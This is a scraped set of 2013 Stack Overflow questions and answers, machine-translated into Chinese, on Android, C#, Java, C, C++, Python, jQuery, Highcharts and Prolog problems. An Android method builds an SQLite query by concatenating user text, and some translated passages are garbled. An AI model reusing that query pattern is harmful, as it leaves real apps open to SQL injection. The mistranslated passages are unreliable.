**首先：** “将 id="price" 转换为数组*，这样您就可以遍历数组中的每个项目。您可以通过在 id 价格中添加括号来做到这一点，如下所示：id="price[]"。但还有另一个这个问题。html中的id被认为是unqiue，这里不是这种情况。你可以给元素一个名字，比如这个name="price[]"。

短版，将行改为：

```
<td name="price[]" style="text-align: right;">$ </td> 
```

***然后在 jQuery 中遍历数组并相应地设置值。***

**Second:** Id's are unique and classes don't have to be, therefore change id to class like this: id="price" to class="price". You could do this as long as you don't have any other element in html that has the name price.

Short verison, change line to:

```
<td class="price" style="text-align: right;">$ </td> 
```

***In the jQuery you then iterate through elements with classname price and set values accordingly.***

# android - SherlockFragmentActivity 在代码中设置视图元素

> ID：15998443
> 
> 赞同：0
> 
> 时间：2013-04-14T11:15:11.727
> 
> 标签：android, android-fragments, actionbarsherlock

我开始使用 Android 开发并创建了一个基于 SherlockActionBar 的应用程序。

现在我坚持从 xml 布局中获取小部件以在代码中设置它们。

这是我的课：

```
public class Streaming extends SherlockFragmentActivity {

    public View onCreateView(LayoutInflater inflater, ViewGroup container, Bundle savedInstanceState) {

        View fragmentView = inflater.inflate(R.layout.view_streaming, container, false);

        // set widgets here..

        return fragmentView;

    }

} 
```

和xml：

```
<ImageView
    android:id="@+id/headerLogo"
    android:layout_width="wrap_content"
    android:layout_height="wrap_content"
    android:background="#FFFFFF"
/> 
```

问题是我无法设置视图本身。背景甚至没有改变为#FFFFFF

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-14T11:51:00.397

只需添加一个标准`protected void onCreate(Bundle savedInstanceState) {}`方法并从那里设置一个视图，就像在一个简单的`Activity`类 ( `setContentView(R.layout.view_streaming);`) 中一样。不需要`onCreateView()`in `SherlockFragmentActivity`。`SherlockFragment`例如，您将使用它`SherlockListFragment`。

# android - 文本未出现在 ListView 中的 android.R.layout.simple_list_2 类型的 ArrayAdapter 中

> ID：15998444
> 
> 赞同：0
> 
> 时间：2013-04-14T11:15:16.987
> 
> 标签：android, listview, android-arrayadapter

我正在使用这个简单的代码来填充包含两个文本视图的自定义行。这些行显然正在填充（因为 Toast 显示哈希映射包含两个字符串值），但列表中的行显示为空白。这很奇怪。可能是什么原因？

```
public class TwoHeaded extends ListActivity {

ArrayList<Map<String, String>> doubleDamage = null;

@Override
protected void onCreate(Bundle savedInstanceState) {
    // TODO Auto-generated method stub
    super.onCreate(savedInstanceState);
    doubleDamage = buildData();
    String[] from = {"platform","os"};
    int[] to = {R.id.tvTwoPlatform, R.id.tvTwoOs};
    SimpleAdapter adapter = new SimpleAdapter(this, doubleDamage,
            android.R.layout.simple_list_item_2, from, to);
    setListAdapter(adapter);
}

private ArrayList<Map<String, String>> buildData(){
    ArrayList<Map<String, String>> list = new ArrayList<Map<String, String>>();
    list.add(putData("Android", "Jelly Bean"));
    list.add(putData("Microsoft", "Windows"));
    list.add(putData("Apple","Macintosh"));
    return list;
}

private HashMap<String, String> putData(String platform, String os){
    HashMap<String, String> item = new HashMap<String, String>();
    item.put(platform, os);
    return item;
}

@Override
protected void onListItemClick(ListView l, View v, int position, long id) {
    // TODO Auto-generated method stub
    Toast.makeText(this, doubleDamage.get(position).toString(), Toast.LENGTH_SHORT).show();
}
} 
```

这是包含两个文本视图的布局文件：

```
 <LinearLayout xmlns:android="http://schemas.android.com/apk/res/android"
android:layout_width="fill_parent"
android:layout_height="wrap_content"
android:layout_alignLeft="@+id/tvTwoPlatform"
android:layout_alignParentTop="true"
android:layout_marginLeft="25dp" >

<TextView
    android:id="@+id/tvTwoPlatform"
    android:layout_width="wrap_content"
    android:layout_height="wrap_content"
    android:layout_marginLeft="?android:attr/listPreferredItemPaddingLeft"
    android:layout_marginTop="8dip"
    android:text="text For Platform "
    android:textAppearance="?android:attr/textAppearanceListItem" />

<TextView
    android:id="@+id/tvTwoOs"
    android:layout_width="wrap_content"
    android:layout_height="wrap_content"
    android:layout_alignLeft="@android:id/text1"
    android:layout_below="@android:id/text1"
    android:text="text For Os"
    android:textAppearance="?android:attr/textAppearanceSmall" />
</LinearLayout> 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-14T12:24:00.827

请参阅 SimpleAdapter(context, data, resource, from, to) 文档。

上面写着：

*   data 地图列表。列表中的每个条目对应于列表中的一行。Maps 包含每一行的数据，并且应该包括“from”中指定的所有条目
*   resource 定义此列表项的视图的视图布局的资源标识符。布局文件应该至少包括那些在“to”中定义的命名视图

所以列表中的每个条目都应该有“平台”和“操作系统”字段，如下所示：

```
private HashMap<String, String> putData(String platform, String os){
    HashMap<String, String> item = new HashMap<String, String>();
    item.put("platform", platform);
    item.put("os", os);
    return item;
} 
```

另外，如果你使用 android.R.layout.simple_list_item_2 作为资源，你的“to”

```
int[] to = {R.id.tvTwoPlatform, R.id.tvTwoOs}; 
```

应该在 layout.simple_list_item_2.xml 文件中定义文本 ID：

```
int[] to = {android.R.id.text1, android.R.id.text2}; 
```

# highcharts - Highstock 烛台图颜色错误

> ID：15998445
> 
> 赞同：1
> 
> 时间：2013-04-14T11:15:25.957
> 
> 标签：highcharts, highstock

[http://jsfiddle.net/uVKNY/](http://jsfiddle.net/uVKNY/)

查看第 3 根蜡烛，开盘 > 收盘，但蜡烛是空的，为什么？[1365870600000,3879.8,3879.8,3806.0,3860.0]

```
// create the chart
var data = [[1365867000000,3905.1,3943.7,3903.6,3903.9],[1365868800000,3903.8,3940.0,3804.0,3804.0],[1365870600000,3879.8,3879.8,3806.0,3860.0],[1365872400000,3920.0,3920.0,3859.0,3870.0],[1365874200000,3900.0,3900.0,3615.8,3852.0],[1365876000000,3702.1,3702.1,3502.0,3554.9],[1365906600000,3411.19,3472.54,3324.8,3400.0],[1365908400000,3460.0,3462.9,3400.0,3462.9],[1365910200000,3472.54,3498.58,3401.0,3498.0],[1365912000000,3420.0,3469.9,3400.0,3429.9],[1365913800000,3455.0,3467.0,3402.0,3466.0]];
    $('#container').highcharts('StockChart', {

        rangeSelector : {
            selected : 1
        },

        title : {
            text : 'AAPL Stock Price'
        },

        series : [{
            type : 'candlestick',
            name : 'AAPL Stock Price',
            data : data,
            dataGrouping : {
                enabled: false
            }
        }]
    });
}); 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-14T11:42:31.657

你认为它应该是黑暗的，因为第三个收盘价低于第三个开盘价。但逻辑实际上是“如果收盘价低于之前的收盘价，则为暗”。见这里：[https ://github.com/highslide-software/highcharts.com/issues/1395](https://github.com/highslide-software/highcharts.com/issues/1395)

# c#-4.0 - 在 Windows Phone 上将字符串解析为 DateTime

> ID：15998446
> 
> 赞同：1
> 
> 时间：2013-04-14T11:15:32.687
> 
> 标签：c#-4.0, windows-phone-8, windows-phone, datetime-format

我想将这种格式的字符串“4/14/2013 ‎1:04 PM”解析为 DateTime 对象。但实际上这不起作用，因为我收到了“System.FormatException”类型的错误。如何解决问题并将我的 DateTime 字符串转换为 DateTime 对象？

谢谢。

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2013-04-14T15:08:43.480

这也有效！

```
var inputdt = "4/14/2013 1:04 PM";
var dt = DateTime.Parse(inputdt, CultureInfo.InvariantCulture); 
```

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2013-04-14T11:47:32.843

You input string is in en-us format, so you should specify correct `CultureInfo` format provider into `DateTime.Parse` method:

```
var ci = new CultureInfo("en-us");

var inputString = "4/14/2013 1:04 PM";
var dt = DateTime.Parse(inputString, ci); 
```

# javascript - jQuery Datepicker - 动态更改可选日期

> ID：15998447
> 
> 赞同：2
> 
> 时间：2013-04-14T11:15:33.240
> 
> 标签：javascript, jquery, jquery-ui, jquery-ui-datepicker

我正在使用 jQuery datepicker，我目前有这个代码：

```
$("#dateObj").datepicker({
    beforeShowDay: findDateAvailable
}); 
```

where`findDateAvailable`是一个检查日期是否在数组中的函数，如果不是，则使日期不可选择。

我的问题是：如何更改哪些日期是“活动的”并且可以在不更改我的数组然后重新创建 datepicker 对象的情况下进行选择？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-04-14T11:39:56.530

您可以使用`refresh`datepicker 小部件的方法。

> 在进行了一些外部修改后，重新绘制日期选择器。此方法不接受任何参数。

参考这里：[http ://api.jqueryui.com/datepicker/#method-refresh](http://api.jqueryui.com/datepicker/#method-refresh)

您可以通过以下方式在脚本中使用它：

```
$("#dateObj").datepicker("refresh"); 
```

工作小提琴：http: [//jsfiddle.net/ChM6D/2/](http://jsfiddle.net/ChM6D/2/)

# java - 从泛型类调用的方法将返回什么类型？

> ID：15998449
> 
> 赞同：4
> 
> 时间：2013-04-14T11:15:34.300
> 
> 标签：java, generics, reflection

有什么方法可以理解从泛型类调用的方法将返回什么类型？

有一个例子：

```
Generified<Integer, Double> generified = new Generified<Integer, Double>();
Method method = generified.getClass().getMethod("getDoubleValue");
Class<?> returnType = ........ 
```

好的，伙计们，有课：

```
public class Generified<T, Z> {
    private T tValue;
    private Z doubleValue;
    private List<T> tValueList;

    public Generified() {
    }

    public T gettValue() {
        return tValue;
    }

    public void settValue(T tValue) {
        this.tValue = tValue;
    }

    public Z getDoubleValue() {
        return doubleValue;
    }

    public void setDoubleValue(Z doubleValue) {
        this.doubleValue = doubleValue;
    }

    public List<T> gettValueList() {
        return tValueList;
    }

    public void settValueList(List<T> tValueList) {
        this.tValueList = tValueList;
    }
} 
```

更新：

这就是我要求的原因：

我正在尝试做可以对集合进行简单聚合的库。这就是我现在所拥有的：[github.README.md](https://github.com/dyrkin/aggregation-utils/blob/master/README.md)

但是我对泛型类方法的返回类型有很多问题。我需要知道真正的返回类型才能用 CGLIB 包装它，并为这个返回类的所有方法添加拦截器，以便将来知道调用层次结构。

但是经过大量调试后，我发现现在有办法做我想做的事，我想哭:)

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-04-14T11:21:02.200

答案从方法名就很明显了——`getDoubleValue()`应该返回`Double`。但是由于您没有为该类提供代码，我们只能猜测。

但是，如果您在这里谈论一般情况，则反射只能走这么远： [Method.getReturnType()](http://docs.oracle.com/javase/1.5.0/docs/api/java/lang/reflect/Method.html#getReturnType%28%29)和[Method.getGenericReturnType()](http://docs.oracle.com/javase/1.5.0/docs/api/java/lang/reflect/Method.html#getGenericReturnType%28%29)。

**更新：** 如果您`MethodSpy`在[此页面](http://docs.oracle.com/javase/tutorial/reflect/member/methodType.html)上查看并针对您的班级运行它，您将获得：

```
public Z Generified.getDoubleValue()
    ReturnType: class java.lang.Object
    GenericReturnType: Z 
```

我认为您无法仅通过查看泛型类来找到所需的内容，它只是不包含您需要的信息。希望这可以帮助。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2013-04-14T12:34:10.777

您可以将 Generified 声明为抽象类，以这种方式实例化它必须使用子类，当您这样做时，您可以在 Generified 构造函数中使用 getClass().getGenericSuperclass() 并检索传入的实际类型参数，例如：

```
package com.stackoverflow.q15998449;

import java.lang.reflect.ParameterizedType;
import java.util.List;

public abstract class Generified<T, Z>
{
    private T tValue;
    private Z doubleValue;
    private List<T> tValueList;

    private final Class<Z> zType;
    private final Class<T> tType;

    @SuppressWarnings("unchecked")
    public Generified()
    {
        ParameterizedType a = ((ParameterizedType) getClass().getGenericSuperclass());
        tType = (Class<T>) a.getActualTypeArguments()[0];
        zType = (Class<Z>) a.getActualTypeArguments()[1];
    }

    public Class<T> getTReturnType()
    {
        return tType;
    }

    public Class<Z> getZReturnType()
    {
        return zType;
    }

    public T gettValue()
    {
        return tValue;
    }

    public void settValue(T tValue)
    {
        this.tValue = tValue;
    }

    public Z getDoubleValue()
    {
        return doubleValue;
    }

    public void setDoubleValue(Z doubleValue)
    {
        this.doubleValue = doubleValue;
    }

    public List<T> gettValueList()
    {
        return tValueList;
    }

    public void settValueList(List<T> tValueList)
    {
        this.tValueList = tValueList;
    } 
```

您班级的用户将如下所示：

```
package com.stackoverflow.q15998449;

import java.lang.reflect.Method;

public class User
{
    public static void main(String[] args) throws NoSuchMethodException, SecurityException
    {
        Generified<Integer, Double> generified = new Generified<Integer, Double>(){};
        Method method = generified.getClass().getMethod("getDoubleValue");
        Class<?> returnType = generified.getZReturnType();
    }
} 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-04-15T02:33:36.237

我不明白问题是什么。你知道`.getGenericReturnType()`返回类型是`Z`. 你知道`Z`的是第二个参数。`Double`并且您在第一行中显式地创建了一个带有具体参数的对象。所以你确切地知道它是什么。

# c - 第 17 行缺少终止 > 字符

> ID：15998456
> 
> 赞同：-5
> 
> 时间：2013-04-14T11:16:10.180
> 
> 标签：c

Gcc 编译器在第 17 行给出错误

```
#include<stdio.h>
void main()
{
    int a[8]={4,9,15,20};
    int b[4]={3,5,10,13};
    int i,j,n=3;
    for(i=0;i<=n;i++)
    {
        if(b[i]<a[i])
        {
            for(j=n;j>=i;j--)
            {
                a[j+1]=a[j];
            }
        a[i]=b[i];
        n=n+1;
        } 
        else
        {
            for(j=n;j>=i;j--)
            {
                a[j+1]=a[j];
            }
        a[i+1]=b[i];
        n++;
        }
    }
    for(i=0;i<8;i++)
    printf(" %d", a[i]);
} 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-14T11:47:25.530

您的代码给出了分段错误，因为您在数组索引大小之后访问内存。

为了调试它，我只是在你的代码中添加了两个喜欢打印`n, i , j`：

```
if(b[i]<a[i])
{
    for(j=n;j>=i;j--)
    {
        a[j+1]=a[j];
    }
    a[i]=b[i];
    n = n+1;            "<---- 1 Correction need here"
    printf("In IF %d %d %d\n", i, j, n);
} 
else
{
    for(j=n;j>=i;j--)
    {
        a[j+1]=a[j];
    }
    a[i+1]=b[i];
    n++;              "<----2 Correction need here"   
    printf("In Else %d %d %d\n", i, j, n);
} 
```

它的输出是：

```
$ ./a.out 
In IF 0 -1 4
In Else 1 0 5
In Else 2 1 6
In Else 3 2 7
In Else 4 3 8     
In IF 5 4 9      
In IF 6 5 10        <--  i, j, n    "buffer overflow"
In IF 7 6 11        <--  i, j, n  
In IF 8 7 12        <--  i, j, n
In IF 20 11 13      <--  i, j, n
 3 4 5 10 13 5 5 10 
```

建议不要 `n`在你的循环中改变你的逻辑

# python - Python程序函数

> ID：15998457
> 
> 赞同：-3
> 
> 时间：2013-04-14T11:16:17.507
> 
> 标签：python, function

我完全理解我必须自己完成这项任务。但是，我对第二个问题的语言有点困惑。

```
def getRVal(pressure_change,viscosity,length,radius, density , choice) 
( this is what I've got so far) 
```

一个函数称为`getRVal`：

– 有六个输入参数：压力变化、粘度、长度、半径、密度和称为**选择 (?** ) 的最终参数；以及 – 返回由参数选择值确定的计算值。

如果选项等于 1，则返回为层流的最大可能压降。

如果选项等于 2，则返回层流所需的最小流体粘度。

如果选项等于 3，则返回流为层流所需的最小管长度。

如果选择等于 4，则返回最大可能的管半径，以使流动成为层流。

请注意，在计算这些最小值/最大值中的每一个时，函数中不会使用相应的输入参数，因此传入什么值无关紧要。

例如，计算最小粘度时，不使用粘度参数的值；计算最大半径时，不使用radius参数的值，以此类推

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-14T11:23:44.837

您的问题是要求您创建一个函数 getFlow，它接受四个参数（压力变化、粘度、长度和半径），函数 getFlow 预计将利用这些参数并以 mL/sec 为单位计算 Hagen-Poiseuille 流速并返回这个值。就像是

```
def getFlow(pressure_change, viscosity, length, radius):
    hagen_flow_rate= (formula to calculate flow rate)
    return hagen_flow_rate

#take input of the values

pressure_change = float(raw_input("Enter Pressure Change"))
viscosity = float(raw_input("Enter viscosity"))
length = float(raw_input("Enter length"))
radius = float(raw_input("Enter radius"))

#call the function here passing the values

getFlow(pressure_change, viscosity, length, radius) 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-14T11:21:00.343

您可以轻松定义一个接受多个参数的函数，例如：

```
def getFlow(p_c, visc, length, radius):
    #these 4 variables are now available in the function name space, use them
    flowrate = p_c*visc*length*radius #insert real formula here ;)
    return flowrate 
```

# c# - 在 WinForms 上使用 TPL 进行并行编程

> ID：15998459
> 
> 赞同：3
> 
> 时间：2013-04-14T11:16:22.927
> 
> 标签：c#, wpf, winforms, task-parallel-library

我尝试在 WinForms .NET 4.0 上使用 TPL，我按照适用于 WPF 的[这些](http://blogs.msdn.com/b/csharpfaq/archive/2010/06/01/parallel-programming-in-net-framework-4-getting-started.aspx)步骤（转到文章末尾）进行了一些小改动，因此它可以在 WinForms 上运行，但仍然无法正常工作。它应该显示结果在标签和richTextBox上，但不是...我认为并行进程的工作导致当我单击按钮时鼠标开始缓慢移动一段时间..

```
public static double SumRootN(int root)
{   double result = 0;
    for (int i = 1; i < 10000000; i++)
    {   result += Math.Exp(Math.Log(i) / root);}
    return result;
}
private void button1_Click(object sender, EventArgs e)
{   richTextBox1.Text = "";
    label1.Text = "Milliseconds: ";
    var watch = Stopwatch.StartNew();
    List<Task> tasks = new List<Task>();
    for (int i = 2; i < 20; i++)
    {   int j = i;
        var t = Task.Factory.StartNew
          (   () =>
                {   var result = SumRootN(j);
                    Dispatcher.CurrentDispatcher.BeginInvoke
                        (new Action
                             (   () => richTextBox1.Text += "root " + j.ToString() 
                                   + " " + result.ToString() + Environment.NewLine
                             )
                         , null
                        );
                 }
            );
        tasks.Add(t);
    }
    Task.Factory.ContinueWhenAll
         (  tasks.ToArray()
            , result =>
                {   var time = watch.ElapsedMilliseconds;
                    Dispatcher.CurrentDispatcher.BeginInvoke
                          (   new Action
                                (    () =>
                                      label1.Text += time.ToString()
                                 )
                           );
                }
        );
} 
```

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2013-04-14T11:28:10.527

您的代码将不起作用，因为显示结果的线程 UI 与 WPF 完全不同。使用 WPF，线程 UI 是 Dispatcher，但在 Windows 窗体上是另一个。

我已经修改了您的代码以帮助它工作。

```
 private void button1_Click(object sender, EventArgs e)
    {
        richTextBox1.Text = "";
        label1.Text = "Milliseconds: ";

        var watch = Stopwatch.StartNew();
        List<Task> tasks = new List<Task>();
        for (int i = 2; i < 20; i++)
        {
            int j = i;
            var t = Task.Factory.StartNew(() =>
            {
                var result = SumRootN(j);
                richTextBox1.Invoke(new Action(
                        () =>
                        richTextBox1.Text += "root " + j.ToString() + " " 
                              + result.ToString() + Environment.NewLine));
            });
            tasks.Add(t);
        }

        Task.Factory.ContinueWhenAll(tasks.ToArray(),
              result =>
              {
                  var time = watch.ElapsedMilliseconds;
                  label1.Invoke(new Action(() => label1.Text += time.ToString()));
              });
    } 
```

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2013-04-15T04:09:45.950

暂且不说这样做好不好，从学习的角度和评论主题“System.Windows.Threading.Dispatcher 和 WinForms？”中提到。答案有些[混乱](https://stackoverflow.com/a/1160035/200449)：

> “如果您确定在 UI 线程中（例如在 button.Click 处理程序中），Dispatcher.CurrentDispatcher 为您提供 UI 线程调度程序，您可以使用它像往常一样从后台线程调度到 UI 线程”

值得一提的是（[也提供了我](https://stackoverflow.com/a/16007664/200449)对上述问题的回答）：

*   `Task.Factory.StartNew()`在不同于主 UI 或其子线程的多个线程上产生执行
*   可以在任何线程上 使用[Dispatcher](http://msdn.microsoft.com/en-us/library/system.windows.threading.dispatcher%28v=vs.100%29.aspx)
*   WPF 应用程序 OOTB（开箱即用）提供 [`System.Windows.Threading.Dispatcher DispatcherObject.Dispatcher`](http://msdn.microsoft.com/en-us/library/system.windows.threading.dispatcherobject%28v=vs.100%29.aspx)了 Winfows 表单中不存在的 UI 线程
*   有问题的使用`Dispatcher.CurrentDispatcher`是让调度程序由非 ui 线程的任务产生

**无论如何，从对原始 WPF 代码进行最小更改**的教学角度来看，您应该已经掌握并使用了 UI 调度程序：

```
private void button1_Click(object sender, EventArgs e)
{   Dispatcher dispatcherUI = Dispatcher.CurrentDispatcher;//added **********
    richTextBox1.Text = "";
    label1.Text = "Milliseconds: ";
    var watch = Stopwatch.StartNew();
    List<Task> tasks = new List<Task>();
    for (int i = 2; i < 20; i++)
    {   int j = i;
        var t = Task.Factory.StartNew
          (   () =>
                {   var result = SumRootN(j);
      //Dispatcher.CurrentDispatcher.BeginInvoke//***changed to
                    dispatcherUI.BeginInvoke
                        (new Action
                             (   () => richTextBox1.Text += "root " + j.ToString() 
                                   + " " + result.ToString() + Environment.NewLine
                             )
                         , null
                        );
                 }
            );
        tasks.Add(t);
    }
    Task.Factory.ContinueWhenAll
         (  tasks.ToArray()
            , result =>
                {   var time = watch.ElapsedMilliseconds;
     //Dispatcher.CurrentDispatcher.BeginInvoke//**************changed to
                    dispatcherUI.BeginInvoke//added
                          (   new Action
                                (    () =>
                                      label1.Text += time.ToString()
                                 )
                           );
                }
        );
} 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-07-14T04:29:47.207

如以下链接所述，正确的方法是完全消除 Dispatcher 类的使用。相反，您应该创建一个相关的 TaskScheduler 实例并将其传递给 Task 方法。 [http://blogs.msdn.com/b/csharpfaq/archive/2010/06/18/parallel-programming-task-schedulers-and-synchronization-context.aspx](http://blogs.msdn.com/b/csharpfaq/archive/2010/06/18/parallel-programming-task-schedulers-and-synchronization-context.aspx)

那是

```
Task.Factory.ContinueWhenAll(tasks.ToArray(),
      result =>
      {
          var time = watch.ElapsedMilliseconds;
          this.Dispatcher.BeginInvoke(new Action(() =>
              label1.Content += time.ToString()));
      }); 
```

会成为

```
var ui = TaskScheduler.FromCurrentSynchronizationContext();
Task.Factory.ContinueWhenAll(tasks.ToArray(),
    result =>
    {
        var time = watch.ElapsedMilliseconds;
        label1.Content += time.ToString();
    }, CancellationToken.None, TaskContinuationOptions.None, ui); 
```

# c++ - 字符串大小保持为零

> ID：15998464
> 
> 赞同：0
> 
> 时间：2013-04-14T11:16:47.503
> 
> 标签：c++

我做了这个功能

输入字符串是这样的“小狐狸是白色的”我正在调用这个函数 myword=my_copy_from(input,11,3) 我想我会得到“狐狸”这个词但是当我使用调试器时我看到后面的大小保持为 0 字节。

这是为什么？？？谢谢

```
 // start of my_copy_from //
     string my_copy_from(string in,short start,short len)
     {
    string back ;
    short i;

    for (i=0 ; i<len; i++)
    {
      back[i]=' ';
      back[i]=in[start+i];

    }

    return back;
}
   // end of my_copy_from // 
```

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2013-04-14T11:21:12.927

超出字符串结尾的索引会导致未定义的行为。你很幸运，程序没有崩溃。

您必须提前调整字符串的大小。

```
back.resize(len); 
```

[`substr`](http://www.cplusplus.com/reference/string/string/substr/)但是，使用成员函数可能更容易。

```
return in.substr(start, len); 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-14T11:51:23.653

因为如果你不分配任何字符串值，也不显式保留一些空间，那么现在*后面*是**空**的，这意味着通过 operator[]对*后面的每次访问都是非法的。*尽管没有执行边界检查，但*通过超出索引范围的 operator[] 访问会导致未定义的行为*，幸运的是您的编译器只是忽略了它。

*为了解决这个问题，你可以显式地为后面*保留一些空间

 *```
string s;
s.reserve(len); // or s.resize(len); 
```

或使用函数*追加*

```
string s;
s.append(in, start, len); 
```

实际上，字符串中已经有一个名为 substr 的函数在做同样的事情。

```
string s = in.substr(start, len); 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-04-14T11:23:24.747

```
string back; 
```

创建一个没有分配任何内存的字符串。所以你的`for`循环是未定义的行为。它也可能崩溃了。在大小为零的字符串上执行 back[i] 没有意义。

首先使用调整大小为您的字符串分配内存。

```
back.resize(len); 
```

在你的`for`循环之前。那么你的程序就有意义了。

在放置实际字符之前插入空格也是没有意义的。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2013-04-14T11:24:49.190

使用 substr 内置函数。不需要 for 循环。

```
string my_copy_from(string in,short start,short len)
     {
    string back ;
    short i;

  /*  for (i=0 ; i<len; i++)
    {
      back[i]=' ';
      back[i]=in[start+i];

    }*/
    back = in.substr(start,len);

    return back;
} 
```*

# prolog - 没有排列的三个列表的组合

> ID：15998468
> 
> 赞同：1
> 
> 时间：2013-04-14T11:17:06.473
> 
> 标签：prolog

我正在尝试生成三个列表的组合，如下所示：

```
A = [[1], [1], [1]] ;
A = [[1], [1], [2]] ;
A = [[1], [1], [3]] ;
A = [[1], [1], [1, 2]] ;
A = [[1], [1], [1, 3]] ;
A = [[1], [1], [2, 3]] ;
A = [[1], [1], [1, 2, 3]] ;
A = [[1], [2], [1]] ;
A = [[1], [2], [2]] ;
... 
```

我想避免排列。例如，如果程序计算`[[1], [1], [2]]`，我不想计算`[[1], [2], [1]]`。

这是我到目前为止所拥有的（它不会避免排列）：

```
% generate a list with 3 combination lists
genera([N1,N2,N3]):- 
tots2(N), num2(M1), combination(M1,N,N1), num2(M2), 
combination(M2,N,N2), num2(M3), combination(M3,N,N3).

num2(N):- member(N, [1,2,3]).
tots2(N):- N = [1,2,3].

% combination(K,L,C) :- C is a list of K distinct elements 
%    chosen from the list L

combination(0,_,[]).
combination(K,L,[X|Xs]) :- K > 0,
   el(X,L,R), K1 is K-1, combination(K1,R,Xs).

% Find out what the following predicate el/3 exactly does.

el(X,[X|L],L).
el(X,[_|L],R) :- el(X,L,R). 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2014-04-25T09:12:18.563

我不知道我的解决方案是否避免了排序谓词中某处的隐藏排列，但我认为可以按照您想要的方式工作：

```
generator0(MaxValue, List) :-
    between(1, MaxValue, Len),
    length(List, Len),
    maplist(between(1, MaxValue), List),
    sort(List, List).

generator(List) :-
    length(List, 3),
    maplist(generator0(3), List),
    msort(List, List). 
```

这是来自的示例输出`generator/1`：

```
?- generator(X).
X = [[1], [1], [1]] ;
X = [[1], [1], [2]] ;
X = [[1], [1], [3]] ;
X = [[1], [1], [1, 2]] ;
X = [[1], [1], [1, 3]] ;
X = [[1], [1], [2, 3]] ;
X = [[1], [1], [1, 2, 3]] ;
X = [[1], [2], [2]] ;
X = [[1], [2], [3]] ;
X = [[1], [2], [2, 3]] ;
X = [[1], [3], [3]] ;
X = [[1], [1, 2], [2]] ; 
```

# android - 当我想从 sqlite 显示一行时出错

> ID：15998470
> 
> 赞同：0
> 
> 时间：2013-04-14T11:17:10.843
> 
> 标签：android

在我的应用程序中，我想显示来自 sqlite 的数据。当我按下按钮显示信息时，我想将返回函数 getInfo 的记录放在 textView 中。这是我的代码：

```
btnShow = (Button) findViewById(R.id.btnInfo);
        final TextView txtNume = (TextView) findViewById(R.id.txtNume);
        final TextView txtPrenume = (TextView) findViewById(R.id.txtPrenume);
        final TextView txtTelefon = (TextView) findViewById(R.id.txtTelefon);
        final TextView txtAdresa = (TextView) findViewById(R.id.txtadresa);
        final TextView txtAdresaEmail = (TextView) findViewById(R.id.txtEmail);
        final TextView txtDataNasterii = (TextView) findViewById(R.id.txtDataNasterii);
        final TextView txtSex = (TextView) findViewById(R.id.txtSex);
        btnShow.setOnClickListener(new OnClickListener() {

            @Override
            public void onClick(View view) {
                Pacienti pacienti = pacientiDB.getInfo(text);
                if (pacienti != null) {
                    pacienti.setTelefon(txtTelefon.getText().toString());
                    pacienti.setPrenume(txtPrenume.getText().toString());
                    pacienti.setNume(txtNume.getText().toString());
                    pacienti.setAdresa(txtAdresa.getText().toString());
                    pacienti.setDataNasterii(txtDataNasterii.getText().toString());
                    pacienti.setEmail(txtAdresaEmail.getText().toString());
                    pacienti.setSex(txtSex.getText().toString());
                    }}

}); 
```

这是函数getInfo：

```
public Pacienti getInfo(String text) {
        Pacienti returnPacient = null;
        Cursor cursor = null;

        try {

            cursor = database.rawQuery("SELECT * FROM " + PACIENTI_NAME
                    + " WHERE prenume = '" + text + "'", null);
            if (cursor.getCount() > 0) {
                int indexTelefon = cursor.getColumnIndex("telefon");
                int indexPrenume = cursor.getColumnIndex("prenume");
                int indexNume = cursor.getColumnIndex("nume");
                int indexAdresaEmail = cursor.getColumnIndex("adresaEmail");
                int indexSex = cursor.getColumnIndex("Sex");
                int indexAdresaBuletin = cursor.getColumnIndex("AdresaBuletin");
                int indexDatanasterii = cursor.getColumnIndex("dataNasterii");
                cursor.moveToFirst();
                do {
                    String nume = cursor.getString(indexNume);
                    String prenume = cursor.getString(indexPrenume);
                    String Telefon = cursor.getString(indexTelefon);
                    String AdresaEmail = cursor.getString(indexAdresaEmail);
                    String Sex = cursor.getString(indexSex);
                    String AdresaBuletin = cursor.getString(indexAdresaBuletin);
                    String DataNasterii = cursor.getString(indexDatanasterii);

                    returnPacient = new Pacienti();
                    returnPacient.setNume(nume);
                    returnPacient.setPrenume(prenume);
                    returnPacient.setTelefon(Telefon);
                    returnPacient.setAdresa(AdresaBuletin);
                    returnPacient.setEmail(AdresaEmail);
                    returnPacient.setDataNasterii(DataNasterii);
                    returnPacient.setSex(Sex);
                    cursor.moveToNext();

                } while (!cursor.isAfterLast());
            }
        } finally {
            if (cursor != null) {
                cursor.close();
            }
        }

        return returnPacient;
    } 
```

但它没有用。我收到此错误，但我不明白为什么，因为我确认我在数据库中有数据：

```
04-14 10:35:33.478: E/AndroidRuntime(278): FATAL EXCEPTION: main
04-14 10:35:33.478: E/AndroidRuntime(278): java.lang.NullPointerException
04-14 10:35:33.478: E/AndroidRuntime(278):  at com.example.medicaldoi.ShowInfo$1.onClick(ShowInfo.java:53)
04-14 10:35:33.478: E/AndroidRuntime(278):  at android.view.View.performClick(View.java:2408)
04-14 10:35:33.478: E/AndroidRuntime(278):  at android.view.View$PerformClick.run(View.java:8816)
04-14 10:35:33.478: E/AndroidRuntime(278):  at android.os.Handler.handleCallback(Handler.java:587)
04-14 10:35:33.478: E/AndroidRuntime(278):  at android.os.Handler.dispatchMessage(Handler.java:92)
04-14 10:35:33.478: E/AndroidRuntime(278):  at android.os.Looper.loop(Looper.java:123)
04-14 10:35:33.478: E/AndroidRuntime(278):  at android.app.ActivityThread.main(ActivityThread.java:4627)
